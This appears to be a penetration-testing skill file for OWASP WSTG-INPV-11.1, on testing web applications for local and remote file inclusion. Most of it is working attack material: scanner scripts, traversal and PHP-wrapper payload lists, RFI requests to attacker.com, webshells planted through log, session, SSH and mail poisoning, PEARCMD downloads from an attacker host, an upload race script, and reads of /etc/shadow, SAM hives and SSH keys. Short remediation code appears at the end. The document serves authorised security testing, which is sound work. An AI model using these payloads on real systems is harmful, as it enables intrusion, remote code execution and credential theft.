---
name: wstg-inpv-11.1
description: "Testing for File Inclusion (LFI/RFI)"
category: input-validation
owasp_id: WSTG-INPV-11.1
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-inpv-11.1

## Test ID

WSTG-INPV-11.1

## Test Name

Testing for Local/Remote File Inclusion

## High-Level Description

File Inclusion vulnerabilities occur when applications dynamically include files based on user input. Local File Inclusion (LFI) allows reading files from the server, while Remote File Inclusion (RFI) allows including files from remote URLs, potentially leading to remote code execution.

---

## What to Check

- [ ] Local File Inclusion (LFI)
- [ ] Remote File Inclusion (RFI)
- [ ] Directory traversal
- [ ] PHP wrappers exploitation
- [ ] Log poisoning
- [ ] Null byte injection

---

## How to Test

### Step 1: Test for File Inclusion

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing for File Inclusion..."

# LFI payloads
LFI_PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "....\/....\/....\/etc/passwd"
    "/etc/passwd"
    "/etc/passwd%00"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
)

# Test LFI
for payload in "${LFI_PAYLOADS[@]}"; do
    response=$(curl -s "$TARGET/page.php?file=$payload")
    if echo "$response" | grep -q "root:"; then
        echo "[VULN] LFI: $payload"
    fi
done

# RFI test
echo "[*] Testing RFI..."
curl -s "$TARGET/page.php?file=http://attacker.com/shell.txt"
```

### Step 2: File Inclusion Tester

```python
#!/usr/bin/env python3
"""
LFI/RFI Vulnerability Tester
"""

import requests
import base64
import re
from urllib.parse import quote

class FileInclusionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # LFI payloads
    LFI_PAYLOADS = [
        # Basic traversal
        "../../../etc/passwd",
        "..\\..\\..\\etc\\passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",  # Double encoding

        # Absolute path
        "/etc/passwd",
        "file:///etc/passwd",

        # Null byte (older PHP)
        "../../../etc/passwd%00",
        "../../../etc/passwd\x00",

        # Windows paths
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",

        # PHP wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd",

        # Data wrapper
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",

        # Expect wrapper
        "expect://id",

        # Input wrapper
        "php://input",
    ]

    # RFI payloads
    RFI_PAYLOADS = [
        "http://attacker.com/shell.txt",
        "https://attacker.com/shell.txt",
        "ftp://attacker.com/shell.txt",
        "//attacker.com/shell.txt",
        "http://attacker.com/shell.txt%00",
    ]

    def test_lfi(self, param='file'):
        """Test Local File Inclusion"""
        print("\n[*] Testing Local File Inclusion...")

        for payload in self.LFI_PAYLOADS:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )

                # Check for /etc/passwd content
                if 'root:' in response.text or 'daemon:' in response.text:
                    print(f"[VULN] LFI - Direct file read!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'LFI - Direct Read',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return True

                # Check for base64 encoded content
                if 'php://filter' in payload:
                    b64_match = re.search(r'[A-Za-z0-9+/=]{50,}', response.text)
                    if b64_match:
                        try:
                            decoded = base64.b64decode(b64_match.group())
                            if b'root:' in decoded or b'<?php' in decoded:
                                print(f"[VULN] LFI via PHP wrapper!")
                                print(f"  Payload: {payload}")
                                self.findings.append({
                                    'type': 'LFI - PHP Wrapper',
                                    'payload': payload,
                                    'severity': 'High'
                                })
                                return True
                        except:
                            pass

                # Check for Windows hosts file
                if '127.0.0.1' in response.text and 'localhost' in response.text:
                    print(f"[VULN] LFI - Windows file read!")
                    self.findings.append({
                        'type': 'LFI - Windows',
                        'payload': payload,
                        'severity': 'High'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_rfi(self, param='file'):
        """Test Remote File Inclusion"""
        print("\n[*] Testing Remote File Inclusion...")

        for payload in self.RFI_PAYLOADS:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )

                # RFI is harder to detect without a callback server
                # Check for remote inclusion errors or success
                if response.status_code == 200:
                    print(f"[INFO] RFI payload accepted: {payload}")
                    print(f"  Note: Check attacker server for callbacks")
                    self.findings.append({
                        'type': 'RFI - Potential',
                        'payload': payload,
                        'severity': 'Critical',
                        'note': 'Verify with callback server'
                    })

            except Exception as e:
                pass

        return False

    def test_log_poisoning(self, param='file'):
        """Test log file poisoning for RCE"""
        print("\n[*] Testing Log Poisoning...")

        log_files = [
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/httpd/access_log',
            '/proc/self/fd/0',
            '/proc/self/environ',
        ]

        for log_file in log_files:
            payload = f"../../../..{log_file}"
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload}
                )

                # Check if log content is included
                if 'GET ' in response.text or 'HTTP/' in response.text:
                    print(f"[VULN] Log file accessible: {log_file}")
                    print(f"  Log poisoning may be possible!")
                    self.findings.append({
                        'type': 'Log Poisoning Potential',
                        'log_file': log_file,
                        'severity': 'High'
                    })

            except Exception as e:
                pass

    def test_php_wrappers(self, param='file'):
        """Test PHP wrapper exploitation"""
        print("\n[*] Testing PHP wrappers...")

        wrappers = [
            # Base64 encode source
            ('php://filter/convert.base64-encode/resource=index.php', 'source'),
            ('php://filter/convert.base64-encode/resource=config.php', 'config'),

            # Data wrapper for RCE
            ('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', 'phpinfo'),
            ('data://text/plain,<?php system($_GET["cmd"]); ?>', 'shell'),

            # Expect wrapper for RCE
            ('expect://id', 'expect'),
        ]

        for wrapper, desc in wrappers:
            try:
                response = self.session.get(
                    self.url,
                    params={param: wrapper}
                )

                if 'base64' in wrapper:
                    b64_match = re.search(r'[A-Za-z0-9+/=]{30,}', response.text)
                    if b64_match:
                        print(f"[VULN] PHP wrapper works: {desc}")
                        self.findings.append({
                            'type': f'PHP Wrapper - {desc}',
                            'payload': wrapper,
                            'severity': 'High'
                        })

                if 'phpinfo' in response.text.lower() or 'PHP Version' in response.text:
                    print(f"[VULN] Code execution via data wrapper!")
                    self.findings.append({
                        'type': 'RCE via Data Wrapper',
                        'payload': wrapper,
                        'severity': 'Critical'
                    })

            except Exception as e:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("FILE INCLUSION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo file inclusion vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:60]}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")

    def run_tests(self, param='file'):
        """Run all file inclusion tests"""
        self.test_lfi(param)
        self.test_rfi(param)
        self.test_php_wrappers(param)
        self.test_log_poisoning(param)
        self.generate_report()

# Usage
tester = FileInclusionTester("https://target.com/page.php")
tester.run_tests()
```

### Step 3: Payload Reference

```
# LFI Traversal Variants
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..././..././..././etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# PHP Wrappers
php://filter/convert.base64-encode/resource=[file]
php://filter/read=string.rot13/resource=[file]
php://input (POST body as PHP)
data://text/plain;base64,[base64_code]
expect://[command]
zip://[zip_file]#[internal_file]
phar://[phar_file]/[internal_file]

# Common Sensitive Files (Linux)
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
/var/log/nginx/error.log
~/.bash_history
~/.ssh/id_rsa

# Common Sensitive Files (Windows)
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\xampp\apache\logs\access.log
C:\inetpub\logs\LogFiles\W3SVC1\
```

---

## Tools

| Tool       | Purpose                    |
| ---------- | -------------------------- |
| LFISuite   | Automated LFI exploitation |
| Burp Suite | Manual testing             |
| fimap      | LFI/RFI scanner            |
| kadimus    | LFI scanner                |

---

## Example Commands/Payloads

```bash
# Basic LFI
curl -s "https://{target}/page.php?file=../../../../etc/passwd" | grep root:

# PHP filter wrapper (source disclosure)
curl -s "https://{target}/page.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d

# RFI probe (requires an attacker-controlled listener)
curl -s "https://{target}/page.php?file=http://attacker.com/shell.txt"

# Log poisoning: plant PHP in User-Agent, then include the log file
curl -s -A '<?php system($_GET["cmd"]); ?>' "https://{target}/"
curl -s "https://{target}/page.php?file=../../../../var/log/nginx/access.log&cmd=id"
```

| Payload | Technique | Detection Pattern |
| --- | --- | --- |
| `../../../../etc/passwd` | Path traversal | `root:.*:0:0:` in response |
| `php://filter/convert.base64-encode/resource=config.php` | PHP wrapper source read | Base64 blob in response decodes to `<?php` |
| `expect://id` | PHP wrapper RCE | `uid=` in response (requires `expect` module) |
| `http://attacker.com/shell.txt` | RFI | Callback received on attacker listener |
| `..%c0%af..%c0%afetc/passwd` | Overlong UTF-8 encoding bypass | `root:` in response despite traversal filter |

### LFI to RCE via PHP filter chain (no upload required)

Chaining `convert.iconv.*` / `convert.base64-*` filters on `php://filter` can mutate arbitrary text into valid PHP and execute it without any file upload. Use [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) to build the chain automatically:

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# then request the generated php://filter/... chain as the `file` param, then &cmd=id
```

### LFI to RCE via PHP PEARCMD (default in official php Docker images)

```bash
# Method 1: config-create + eval webshell
curl "https://{target}/vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval(\$_GET['cmd'])?>+/tmp/exec.php"
curl "https://{target}/vuln.php?file=/tmp/exec.php&cmd=phpinfo();"

# Method 2: man_dir webshell
curl "https://{target}/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system(\$_GET['c']));?>+-s+"
curl "https://{target}/vuln.php?file=/tmp/exec.php&c=id"
```

### LFI to RCE via /proc/self/environ and /proc/*/fd

```bash
# Poison User-Agent, then include the environ of the worker process
curl -s -A '<?php system($_GET["cmd"]); ?>' "https://{target}/page.php"
curl -s "https://{target}/page.php?file=/proc/self/environ&cmd=id"

# Race-read an open file descriptor holding an uploaded/POSTed payload
curl -s "https://{target}/page.php?file=/proc/self/fd/[0-40]"
```

### LFI to RCE via phpinfo() (file_uploads oracle)

If `phpinfo()` is reachable, a raced multipart upload leaves a temp file (`/tmp/php[a-zA-Z0-9]{6}`) briefly readable — include it with a bruteforced name while re-uploading in a loop (see LFIcore/fuzz_wrapper.py in PayloadsAllTheThings). Reference script: [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py).

### LFI to RCE via /proc/*/fd (file descriptor bruteforce)

Upload many shells first (e.g. 100), then bruteforce both the process PID and the file descriptor number to catch one still held open by the web server worker:

```bash
curl -s "https://{target}/index.php?page=/proc/$PID/fd/$FD"
```

### LFI to RCE via iconv / glibc OOB (CVE-2024-2961)

Use the `iconv` wrapper chain to trigger an out-of-bounds write in glibc `iconv()` (CVE-2024-2961), then leverage the LFI to read `/proc/self/maps` and download the target glibc binary, and finally corrupt the `zend_mm_heap` structure to remap `free()` to `system()`.

- Requirements: PHP 7.0.0–8.3.7, glibc <= 2.39, access to `convert.iconv`, `zlib.inflate`, `dechunk` filters.
- Exploit: [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)

### LFI to RCE via direct file upload (no race needed)

If any upload feature (avatar, document, image) accepts arbitrary content, inject the PHP payload directly (best hidden inside metadata of an image/doc/pdf to survive processing) and include the uploaded path:

```bash
# payload inside uploaded file, e.g. shell.png: <?php system($_GET['c']); ?>
curl -s "https://{target}/index.php?page=path/to/uploaded/shell.png&c=id"
```

### LFI to RCE via upload race condition (bruteforce /tmp)

```python
import itertools, requests, string, sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)

print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + ''.join(fname)
    r = requests.get(url)
    if 'load average' in r.text:  # payload: <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)
```

### LFI to RCE via upload on Windows (FindFirstFile wildcard mask)

Windows-only: `FindFirstFile` accepts wildcard masks in LFI paths (`<<` = `*`, `>` = `?`). Uploaded files land in `C:\Windows\Temp\` as `php[A-F0-9]{4}.tmp` — skip bruteforcing all 65536 names and use a mask instead:

```
http://{target}/vuln.php?inc=c:\windows\temp\php<<
```

### LFI to RCE via controlled log files (full path list + protocol-specific poisoning)

```
http://{target}/index.php?page=/var/log/apache/access.log
http://{target}/index.php?page=/var/log/apache/error.log
http://{target}/index.php?page=/var/log/apache2/access.log
http://{target}/index.php?page=/var/log/apache2/error.log
http://{target}/index.php?page=/var/log/nginx/access.log
http://{target}/index.php?page=/var/log/nginx/error.log
http://{target}/index.php?page=/var/log/vsftpd.log
http://{target}/index.php?page=/var/log/sshd.log
http://{target}/index.php?page=/var/log/mail
http://{target}/index.php?page=/var/log/httpd/error_log
http://{target}/index.php?page=/usr/local/apache/log/error_log
http://{target}/index.php?page=/usr/local/apache2/log/error_log
```

RCE via SSH — inject PHP as the SSH username, then include the auth log (works even without valid credentials, the attempt is still logged):

```bash
ssh '<?php system($_GET["cmd"]);?>'@{target}
curl -s "https://{target}/index.php?page=/var/log/auth.log&cmd=id"
```

RCE via Mail — send an email with PHP code in the header/body via an open SMTP relay, then include the mail log:

```
telnet {target} 25
helo ok
mail from: mail@example.com
rcpt to: root
data
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

```bash
# or with the mail CLI
mail -s "<?php system(\$_GET['cmd']);?>" www-data@{target} < /dev/null
curl -s "https://{target}/index.php?page=/var/log/mail&cmd=id"
```

RCE via Apache access log poisoning (single quotes avoid the log escaping double quotes):

```bash
curl -s "http://{target}/" -A "<?php system(\$_GET['cmd']);?>"
curl -s "http://{target}/test.php?page=/var/log/apache2/access.log&cmd=id"
```

### LFI to RCE via PHP session files

Check for a `PHPSESSID` cookie, then poison a session value that gets written verbatim into the session file (`/var/lib/php5/sess_[PHPSESSID]` or `/var/lib/php/sessions/sess_[PHPSESSID]`):

```bash
# Step 1: poison the session (e.g. login form field reflected into $_SESSION)
curl -s "https://{target}/login.php" --data 'login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php'

# Step 2: include the session file via the LFI parameter
curl -s "https://{target}/login.php" --data 'login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27'
```

### PHP PEARCMD — additional methods (download / install, needs outbound network)

```bash
# Method 3: download (fetches exec.php into the cwd)
curl "https://{target}/vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://{attacker-ip}:{port}/exec.php"
curl "https://{target}/vuln.php?file=exec.php&c=id"

# Method 4: install (exec.php lands at /tmp/pear/download/exec.php)
curl "https://{target}/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://{attacker-ip}:{port}/exec.php"
curl "https://{target}/vuln.php?file=/tmp/pear/download/exec.php&c=id"
```

### LFI to credential files (privilege escalation / lateral movement, no direct RCE)

```bash
# Windows - dump SAM/SYSTEM registry hives, then samdump2 SYSTEM SAM > hashes.txt and crack with hashcat/john or Pass-the-Hash
curl -s "https://{target}/index.php?page=../../../../../../WINDOWS/repair/sam"
curl -s "https://{target}/index.php?page=../../../../../../WINDOWS/repair/system"

# Linux - dump /etc/shadow for offline cracking, then SSH in
curl -s "https://{target}/index.php?page=../../../../../../etc/shadow"

# Linux - read a private SSH key for any user with a home directory (enumerate users via /etc/passwd first)
curl -s "https://{target}/index.php?page=../../../../../../home/{user}/.ssh/id_rsa"
```

### PHP Wrapper Reference (full)

| Wrapper | Purpose | Example |
| --- | --- | --- |
| `php://filter/read=string.rot13/resource=[file]` | Display file as ROT13 (dodges naive `<?php` string filters) | `php://filter/read=string.rot13/resource=index.php` |
| `php://filter/convert.iconv.utf-8.utf-16/resource=[file]` | Re-encode file content | `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` |
| `php://filter/convert.base64-encode/resource=[file]` | Base64-dump source/config files | `php://filter/convert.base64-encode/resource=index.php` |
| `php://filter/zlib.deflate/convert.base64-encode/resource=[file]` | Compress + base64 for large files | `php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd` |
| `php://filter/convert.iconv...` chain | Turn any string into valid PHP → RCE, no upload needed | see `php_filter_chain_generator` below |
| `php://input` | Execute POSTed body as PHP (needs `allow_url_include=On`) | `curl -X POST --data '<?php system($_GET["cmd"]); ?>' "...?page=php://input%00"` |
| `data://text/plain;base64,[b64]` | Execute arbitrary base64-encoded PHP inline | `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+` |
| `expect://[cmd]` | Direct shell command execution (requires `expect` PECL module) | `expect://id` |
| `zip://[archive]#[internal_file]` | Include a file packed inside an uploaded zip/jpg polyglot | `zip://shell.jpg%23payload.php` |
| `phar://[archive]/[internal_file]` | Include file inside a `.phar` archive; also enables PHP object deserialization via metadata (PHP < 8) | `phar:///var/www/html/archive.phar/test.txt` |
| `convert.iconv://` / `dechunk://` | Blind file-read oracle via error/timing side channel | see below |

The `php://filter` part is case-insensitive (`pHp://FilTer/...` also works, useful for WAF bypass). Filters can be chained multiple times with `|` or `/`, e.g. `php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s`.

```bash
# Automated source dump with kadimus
./kadimus -u "http://{target}/index.php?page=vuln" -S -f "index.php%00" -O index.php --parameter page
curl "http://{target}/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php

# php://input RCE via kadimus
./kadimus -u "https://{target}/index.php?page=php://input%00" -C '<?php echo shell_exec("id"); ?>' -T input

# data:// wrapper also triggers reflected XSS while bypassing Chrome Auditor
curl -s "https://{target}/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
```

### zip:// wrapper — full walkthrough

```bash
echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
zip payload.zip payload.php
mv payload.zip shell.jpg   # disguise as an image for the upload filter
rm payload.php
# upload shell.jpg, then:
curl -s "https://{target}/index.php?page=zip://shell.jpg%23payload.php&cmd=id"
```

### phar:// wrapper — archive execution and PHP object deserialization

```php
<?php
  $phar = new Phar('archive.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering();
?>
```

```bash
php --define phar.readonly=0 archive.php   # build the .phar
curl -s "http://{target}/?page=phar:///var/www/html/archive.phar/test.txt"
```

PHAR deserialization (PHP < 8 only): any of `include`, `file_exists`, `file_get_contents`, `copy`, `is_file`, `stat`, `filesize`, `getimagesize`, `md5_file`, etc. performed on a `phar://` path unserializes the archive's metadata — if any loaded class has a `__destruct()`/`__wakeup()` gadget, craft a phar with a serialized object as metadata (`$phar->setMetadata($object)`) to trigger it. `$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>")` prepends JPG magic bytes to pass upload validation.

### convert.iconv:// / dechunk:// blind file-read oracle

When `file_exists`/`is_file` is NOT used server-side, this leaks arbitrary file content one character at a time via an error-based or timing side channel, without ever seeing the content directly:

1. `convert.iconv.*` with an encoding that exponentially expands data size to trigger a memory-limit error.
2. `dechunk://` wipes the whole buffer only if it starts with `A-Fa-f0-9` — used to test/determine the leading character.
3. Repeat with iconv encodings that reorder bytes to shift each remaining character into the tested position.

```bash
python3 filters_chain_oracle_exploit.py --target http://{target} --file '/etc/passwd' --parameter 0
```

Tooling: [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit) (POST request needed, GET is capped ~135 chars leaked).

Related: [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) wraps a file's content with an attacker-chosen prefix/suffix via `php://filter` chain, useful when the app expects a specific format (e.g. JSON `{"message":"..."}`) before echoing it back:

```bash
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
```

[ambionics/lightyear](https://github.com/ambionics/lightyear) automates a blind file-read primitive end to end:

```bash
./lightyear.py /etc/passwd
```

Full RCE payload generator for the chain (instead of the oracle, direct code execution): [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py) — generates a `php://filter` chain that turns `$_GET[0]` into executable PHP without any upload.

---

## Remediation

```php
<?php
// PHP - Use allowlists and avoid dynamic includes
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (in_array($page, $allowed_pages)) {
    include("pages/{$page}.php");
} else {
    include("pages/404.php");
}

// Never include user input directly
// VULNERABLE: include($_GET['file']);
// VULNERABLE: include("pages/" . $_GET['file'] . ".php");
?>
```

```python
# Python - Safe file access
import os

ALLOWED_DIR = '/var/www/app/templates/'

def safe_include(filename):
    # Normalize path
    requested_path = os.path.normpath(
        os.path.join(ALLOWED_DIR, filename)
    )

    # Verify path is within allowed directory
    if not requested_path.startswith(ALLOWED_DIR):
        raise ValueError("Invalid path")

    # Verify file exists
    if not os.path.isfile(requested_path):
        raise FileNotFoundError("File not found")

    return requested_path
```

---

## Risk Assessment

| Finding                 | CVSS | Severity |
| ----------------------- | ---- | -------- |
| RFI to RCE              | 9.8  | Critical |
| LFI with PHP wrappers   | 8.6  | High     |
| LFI sensitive file read | 7.5  | High     |
| Log poisoning to RCE    | 9.1  | Critical |

---

## CWE Categories

| CWE ID     | Title                                            |
| ---------- | ------------------------------------------------ |
| **CWE-98** | Improper Control of Filename for Include/Require |


---

## References

- [OWASP WSTG - WSTG-INPV-11.1: Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PayloadsAllTheThings - Directory Traversal / File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)

---

## Checklist

```
[ ] LFI traversal tested
[ ] Multiple encodings tested
[ ] PHP wrappers tested
[ ] RFI tested
[ ] Log poisoning tested
[ ] Null byte tested
[ ] Findings documented
```
